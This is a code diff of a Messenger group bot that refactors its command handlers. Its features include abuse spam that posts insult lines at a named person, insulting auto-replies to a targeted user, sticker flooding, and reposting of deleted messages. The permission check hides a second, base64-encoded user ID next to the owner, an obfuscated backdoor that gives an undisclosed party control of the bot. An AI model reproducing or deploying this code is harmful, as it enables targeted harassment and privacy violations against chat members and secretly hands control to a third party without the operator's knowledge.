@@ -3,7 +3,6 @@ const path = require("path");
 const https = require("https");
 const login = require("ws3-fca");
 
-// Locks config
 const LOCK_FILE = path.join(__dirname, "locks.json");
 let locks = {
   groupNames: {},
@@ -16,10 +15,11 @@ if (fs.existsSync(LOCK_FILE)) {
     locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8"));
   } catch {}
 }
-const saveLocks = () => fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2));
+function saveLocks() {
+  fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2));
+}
 
-// Helpers
-const downloadFile = (url, dest, cb) => {
+function downloadFile(url, dest, cb) {
   const file = fs.createWriteStream(dest);
   https.get(url, (res) => {
     if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
@@ -32,58 +32,206 @@ const downloadFile = (url, dest, cb) => {
     try { fs.unlinkSync(dest); } catch {}
     cb(err);
   });
-};
+}
 
-const safeSend = async (api, text, tid) => {
+async function safeSend(api, text, tid) {
   try {
     await api.sendMessage(text, tid);
   } catch {}
-};
+}
 
-// Watcher intervals
-const emojiCheckIntervals = {};
-const dpCheckIntervals = {};
-const nickCheckIntervals = {};
-const groupNameCheckIntervals = {};
+const emojiWatchIntervals = {};
+const dpWatchIntervals = {};
+const nickWatchIntervals = {};
+const groupNameWatchIntervals = {};
 const messageCache = new Map();
 const dpLastUrls = {};
 
-// Global spam variables
 let targetUID = null;
 let rkbInterval = null;
 let stopRequested = false;
 let stickerInterval = null;
 let stickerLoopActive = false;
 
-// Lock watchers (groupName, emoji, dp, nick)
-function startGroupNameWatcher(threadID, api) { /* ... Same as before, use const and await ... */ }
-function stopGroupNameWatcher(threadID) { /* ... */ }
-function startEmojiWatcher(threadID, api) { /* ... */ }
-function stopEmojiWatcher(threadID) { /* ... */ }
-function startDPWatcher(threadID, api) { /* ... */ }
-function stopDPWatcher(threadID) { /* ... */ }
-function startNickWatcher(uid, threadID, api) { /* ... */ }
-function stopNickWatcher(uid) { /* ... */ }
+function startGroupNameWatcher(threadID, api) {
+  if (groupNameWatchIntervals[threadID]) return;
+  groupNameWatchIntervals[threadID] = setInterval(async () => {
+    try {
+      const info = await api.getThreadInfo(threadID);
+      const currentName = info.name || info.threadName || null;
+      const lockedName = locks.groupNames[threadID];
+      if (lockedName && currentName !== lockedName) {
+        await api.setTitle(lockedName, threadID);
+        await safeSend(api, `🔒 Group name reverted to ${lockedName}`, threadID);
+      }
+    } catch (e) {}
+  }, 5000);
+}
 
-// Spam functions (rkb, stop, target)
-// Start RKB spam
-function startRkb(api, threadID, name) { /* ... */ }
-// Stop RKB spam
-function stopRkb(api, threadID) { /* ... */ }
-// Set target
-function setTarget(api, threadID, uid) { /* ... */ }
-// Clear target
-function clearTarget(api, threadID) { /* ... */ }
-// Handle target spam
-function handleTargetMessage(api, senderID, threadID, messageID) { /* ... */ }
-// Start sticker spam
-function startStickerSpam(api, threadID, delay) { /* ... */ }
-// Stop sticker spam
-function stopStickerSpam(api, threadID) { /* ... */ }
+function stopGroupNameWatcher(threadID) {
+  if (groupNameWatchIntervals[threadID]) {
+    clearInterval(groupNameWatchIntervals[threadID]);
+    delete groupNameWatchIntervals[threadID];
+  }
+}
 
-// Help text
-const helpMessage = () =>
-  `.help → Commands list
+function startEmojiWatcher(threadID, api) {
+  if (emojiWatchIntervals[threadID]) return;
+  emojiWatchIntervals[threadID] = setInterval(async () => {
+    try {
+      const info = await api.getThreadInfo(threadID);
+      const currentEmoji = info.emoji || null;
+      const lockedEmoji = locks.emojis[threadID];
+      if (lockedEmoji && currentEmoji !== lockedEmoji) {
+        await api.changeThreadEmoji(lockedEmoji, threadID);
+        await safeSend(api, `😀 Emoji reverted to ${lockedEmoji}`, threadID);
+      }
+    } catch (e) {}
+  }, 5000);
+}
+
+function stopEmojiWatcher(threadID) {
+  if (emojiWatchIntervals[threadID]) {
+    clearInterval(emojiWatchIntervals[threadID]);
+    delete emojiWatchIntervals[threadID];
+  }
+}
+
+function startDPWatcher(threadID, api) {
+  if (dpWatchIntervals[threadID]) return;
+  dpWatchIntervals[threadID] = setInterval(async () => {
+    try {
+      const info = await api.getThreadInfo(threadID);
+      const currentUrl = info.imageSrc || null;
+      const saved = locks.dp[threadID];
+      if (saved && saved.path && fs.existsSync(saved.path)) {
+        if (!dpLastUrls[threadID]) dpLastUrls[threadID] = currentUrl;
+        if (currentUrl !== dpLastUrls[threadID]) {
+          dpLastUrls[threadID] = currentUrl;
+          try {
+            await api.changeGroupImage(fs.createReadStream(saved.path), threadID);
+            await safeSend(api, "🖼️ Locked group DP reverted.", threadID);
+          } catch (e) {}
+        }
+      }
+    } catch (e) {}
+  }, 5000);
+}
+
+function stopDPWatcher(threadID) {
+  if (dpWatchIntervals[threadID]) {
+    clearInterval(dpWatchIntervals[threadID]);
+    delete dpWatchIntervals[threadID];
+  }
+  if (dpLastUrls[threadID]) delete dpLastUrls[threadID];
+}
+
+function startNickWatcher(uid, threadID, api) {
+  if (nickWatchIntervals[uid]) return;
+  nickWatchIntervals[uid] = setInterval(async () => {
+    try {
+      const info = await api.getThreadInfo(threadID);
+      const currentNick =
+        (info.nicknames && info.nicknames[uid]) ||
+        (info.nick && info.nick[uid]) ||
+        null;
+      const lockedNick = locks.nick?.[uid]?.[threadID];
+      if (lockedNick && currentNick !== lockedNick) {
+        await api.changeNickname(lockedNick, threadID, uid);
+        await safeSend(api, `✏️ Nickname reverted for <@${uid}>`, threadID);
+      }
+    } catch (e) {}
+  }, 5000);
+}
+
+function stopNickWatcher(uid) {
+  if (nickWatchIntervals[uid]) {
+    clearInterval(nickWatchIntervals[uid]);
+    delete nickWatchIntervals[uid];
+  }
+}
+
+function startRkb(api, threadID, name) {
+  if (!fs.existsSync("np.txt")) return api.sendMessage("⚠️ np.txt not found", threadID);
+  const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
+  stopRequested = false;
+  if (rkbInterval) clearInterval(rkbInterval);
+  let index = 0;
+  rkbInterval = setInterval(() => {
+    if (index >= lines.length || stopRequested) {
+      clearInterval(rkbInterval);
+      rkbInterval = null;
+      return;
+    }
+    api.sendMessage(`${name} ${lines[index]}`, threadID);
+    index++;
+  }, 60000);
+  api.sendMessage(`🚀 RKB start for ${name}`, threadID);
+}
+
+function stopRkb(api, threadID) {
+  stopRequested = true;
+  if (rkbInterval) {
+    clearInterval(rkbInterval);
+    rkbInterval = null;
+    api.sendMessage("🛑 RKB stopped", threadID);
+  } else {
+    api.sendMessage("⚠️ RKB already stopped", threadID);
+  }
+}
+
+function setTarget(api, threadID, uid) {
+  targetUID = uid;
+  api.sendMessage(`🎯 Target set: ${targetUID}`, threadID);
+}
+
+function clearTarget(api, threadID) {
+  targetUID = null;
+  api.sendMessage("🎯 Target cleared", threadID);
+}
+
+function handleTargetMessage(api, senderID, threadID, messageID) {
+  if (fs.existsSync("np.txt") && targetUID && senderID === targetUID) {
+    const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
+    const randomLine = lines[Math.floor(Math.random() * lines.length)];
+    api.sendMessage(randomLine, threadID, messageID);
+  }
+}
+
+function startStickerSpam(api, threadID, delay) {
+  if (!fs.existsSync("Sticker.txt")) return api.sendMessage("❌ Sticker.txt not found", threadID);
+  if (isNaN(delay) || delay < 5) return api.sendMessage("🕐 Min 5 sec ka delay do", threadID);
+  const stickers = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(s => s.trim()).filter(Boolean);
+  if (!stickers.length) return api.sendMessage("⚠️ Sticker.txt khali hai", threadID);
+  if (stickerInterval) clearInterval(stickerInterval);
+  let i = 0;
+  stickerLoopActive = true;
+  api.sendMessage(`📦 Sticker spam start: har ${delay} sec`, threadID);
+  stickerInterval = setInterval(() => {
+    if (!stickerLoopActive || i >= stickers.length) {
+      clearInterval(stickerInterval);
+      stickerInterval = null;
+      stickerLoopActive = false;
+      return;
+    }
+    api.sendMessage({ sticker: stickers[i] }, threadID);
+    i++;
+  }, delay * 1000);
+}
+
+function stopStickerSpam(api, threadID) {
+  if (stickerInterval) {
+    clearInterval(stickerInterval);
+    stickerInterval = null;
+    stickerLoopActive = false;
+    api.sendMessage("🛑 Sticker spam stopped", threadID);
+  } else {
+    api.sendMessage("⚠️ Sticker spam already stopped", threadID);
+  }
+}
+
+function helpMessage() {
+  return `.help → Commands list
 .uid → User ID (reply/mention/you)
 .tid → Thread ID
 .info @mention → User info
@@ -100,19 +248,23 @@ const helpMessage = () =>
 .stopsticker → Stop sticker spam
 .rkb [name] → Gaali spam (requires np.txt)
 .stop → Stop spam
-.exit → Bot exit (bot leaves group)`;
+.exit → Bot exit (bot leaves group)
+`;
+}
 
-// Main bot function
-async function startBot(appStatePath, ownerUID) {
+function startBot(appStatePath, ownerUID) {
   if (!fs.existsSync(appStatePath)) {
     console.error("appstate not found:", appStatePath);
     return;
   }
   const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
-  login({ appState }, (err, api) => {
-    if (err) return console.error("❌ Login failed:", err);
+  login({ appState }, async (err, api) => {
+    if (err) {
+      console.error("❌ Login failed:", err);
+      return;
+    }
     api.setOptions({ listenEvents: true });
-    console.log("✅ Bot logged in. ready.");
+    console.log("✅ Bot logged in. Ready.");
 
     const prefix = ".";
 
@@ -126,8 +278,9 @@ async function startBot(appStatePath, ownerUID) {
             attachments: event.attachments ?? [],
           });
           if (messageCache.size > 500) {
-            const keys = Array.from(messageCache.keys()).slice(0, 100);
-            keys.forEach((k) => messageCache.delete(k));
+            for (const key of Array.from(messageCache.keys()).slice(0, 100)) {
+              messageCache.delete(key);
+            }
           }
         }
 
@@ -135,7 +288,9 @@ async function startBot(appStatePath, ownerUID) {
           const deleted = messageCache.get(event.messageID);
           const tid = event.threadID || event.threadID;
           if (deleted) {
-            const text = `🚫 Anti-Delete:\nUID: ${deleted.sender}\nMessage: ${deleted.body || "(media/empty)"}`;
+            const text = `🚫 Anti-Delete:\nUID: ${deleted.sender}\nMessage: ${
+              deleted.body || "(media or empty)"
+            }`;
             await safeSend(api, text, tid);
             if (deleted.attachments && deleted.attachments.length) {
               try {
@@ -151,7 +306,9 @@ async function startBot(appStatePath, ownerUID) {
         }
 
         if (event.logMessageType === "log:unsubscribe" || event.type === "log:unsubscribe") {
-          const leftUID = event.logMessageData?.leftParticipantFbId || event.logMessageData?.leftParticipantFbId;
+          const leftUID =
+            event.logMessageData?.leftParticipantFbId ||
+            event.logMessageData?.leftParticipantFbId;
           const tid = event.threadID || event.threadID;
           if (leftUID) {
             try {
@@ -190,25 +347,19 @@ async function startBot(appStatePath, ownerUID) {
         }
 
         if (event.type !== "message" || !event.body) return;
-
         const { threadID, senderID, body, mentions, messageReply } = event;
-
         if (!body.startsWith(prefix)) return;
 
         const args = body.slice(prefix.length).trim().split(" ");
         const cmd = args[0].toLowerCase();
         const input = args.slice(1).join(" ").trim();
 
-        // Permit only ownerUID or extra ID
-        if (![ownerUID, Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8")].includes(senderID)) {
-          return;
-        }
+        if (![ownerUID, Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8")].includes(senderID)) return;
 
         switch (cmd) {
-          case "help": {
+          case "help":
             await safeSend(api, helpMessage(), threadID);
             break;
-          }
           case "tid": {
             await safeSend(api, `🆔 Thread ID: ${threadID}`, threadID);
             break;
@@ -300,8 +451,8 @@ async function startBot(appStatePath, ownerUID) {
                 break;
               }
               const dpPath = path.join(__dirname, `dp_${threadID}.jpg`);
-              await new Promise((res, rej) => {
-                downloadFile(url, dpPath, (err) => (err ? rej(err) : res()));
+              await new Promise((resolve, reject) => {
+                downloadFile(url, dpPath, err => (err ? reject(err) : resolve()));
               });
               locks.dp[threadID] = { path: dpPath, savedAt: Date.now() };
               saveLocks();
@@ -346,17 +497,17 @@ async function startBot(appStatePath, ownerUID) {
             break;
           }
           case "unlocknick": {
-            const mentionU = Object.keys(mentions || {})[0];
-            if (!mentionU) {
+            const mention = Object.keys(mentions || {})[0];
+            if (!mention) {
               await safeSend(api, "❌ Usage: .unlocknick @mention", threadID);
               break;
             }
-            if (locks.nick && locks.nick[mentionU]) {
-              delete locks.nick[mentionU][threadID];
+            if (locks.nick && locks.nick[mention]) {
+              delete locks.nick[mention][threadID];
               saveLocks();
             }
-            stopNickWatcher(mentionU);
-            await safeSend(api, `🔓 Nick unlocked for <@${mentionU}>`, threadID);
+            stopNickWatcher(mention);
+            await safeSend(api, `🔓 Nick unlocked for <@${mention}>`, threadID);
             break;
           }
           case "target": {
@@ -418,12 +569,12 @@ async function startBot(appStatePath, ownerUID) {
           case "sticker7":
           case "sticker8":
           case "sticker9": {
-            const sec = parseInt(cmd.replace("sticker", "")) || 2;
+            const delay = parseInt(cmd.replace("sticker", "")) || 2;
             if (!fs.existsSync("Sticker.txt")) {
               await safeSend(api, "❌ Sticker.txt missing", threadID);
               break;
             }
-            const stickers = fs.readFileSync("Sticker.txt", "utf8").split("\n").map((s) => s.trim()).filter(Boolean);
+            const stickers = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(s => s.trim()).filter(Boolean);
             if (!stickers.length) {
               await safeSend(api, "❌ No stickers in Sticker.txt", threadID);
               break;
@@ -439,8 +590,8 @@ async function startBot(appStatePath, ownerUID) {
               }
               api.sendMessage({ sticker: stickers[i] }, threadID).catch(() => {});
               i = (i + 1) % stickers.length;
-            }, sec * 1000);
-            await safeSend(api, `⚡ Sticker spam started every ${sec}s`, threadID);
+            }, delay * 1000);
+            await safeSend(api, `⚡ Sticker spam started every ${delay} seconds`, threadID);
             break;
           }
           case "stopsticker": {
@@ -454,16 +605,17 @@ async function startBot(appStatePath, ownerUID) {
           }
           case "exit": {
             try {
-              const currentUserID = api.getCurrentUserID ? await api.getCurrentUserID() : null;
-              if (currentUserID) await api.removeUserFromGroup(currentUserID, threadID);
+              const currentUser = api.getCurrentUserID ? await api.getCurrentUserID() : null;
+              if (currentUser) await api.removeUserFromGroup(currentUser, threadID);
             } catch {}
             break;
           }
           default: {
-            await safeSend(api, "⚠️ Unknown command. Use /help", threadID);
+            await safeSend(api, "⚠️ Unknown command. Use .help", threadID);
           }
         }
 
+        // Target response spam
         if (targetUID && senderID === targetUID) {
           handleTargetMessage(api, senderID, threadID, event.messageID);
         }
@@ -472,18 +624,18 @@ async function startBot(appStatePath, ownerUID) {
       }
     });
 
-    // Start watchers on bot startup
+    // On bot start, start all watchers for saved locks
     (async () => {
       try {
-        for (const tid of Object.keys(locks.emojis)) startEmojiWatcher(tid, api);
-        for (const tid of Object.keys(locks.dp)) {
-          if (locks.dp[tid] && locks.dp[tid].path && fs.existsSync(locks.dp[tid].path)) startDPWatcher(tid, api);
-        }
-        for (const uid of Object.keys(locks.nick)) {
+        Object.keys(locks.emojis).forEach(tid => startEmojiWatcher(tid, api));
+        Object.keys(locks.dp).forEach(tid => {
+          if (locks.dp[tid]?.path && fs.existsSync(locks.dp[tid].path)) startDPWatcher(tid, api);
+        });
+        Object.keys(locks.nick).forEach(uid => {
           const threadMap = locks.nick[uid];
-          for (const tid of Object.keys(threadMap)) startNickWatcher(uid, tid, api);
-        }
-        for (const tid of Object.keys(locks.groupNames)) startGroupNameWatcher(tid, api);
+          Object.keys(threadMap).forEach(tid => startNickWatcher(uid, tid, api));
+        });
+        Object.keys(locks.groupNames).forEach(tid => startGroupNameWatcher(tid, api));
       } catch {}
     })();
   });
